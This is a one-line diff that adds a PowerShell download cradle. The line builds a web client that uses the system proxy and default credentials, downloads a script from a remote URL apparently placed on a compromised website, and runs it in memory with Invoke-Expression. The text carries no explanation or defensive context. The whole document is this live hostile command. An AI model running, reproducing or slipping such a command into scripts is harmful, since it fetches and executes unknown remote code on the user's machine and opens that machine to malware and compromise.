@@ -1,0 +1,1 @@
+$V=new-object net.webclient;$V.proxy=[Net.WebRequest]::GetSystemWebProxy();$V.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;IEX $V.downloadstring('http://imonty.cn/wp-includes/pomo/script/js/js.js');;
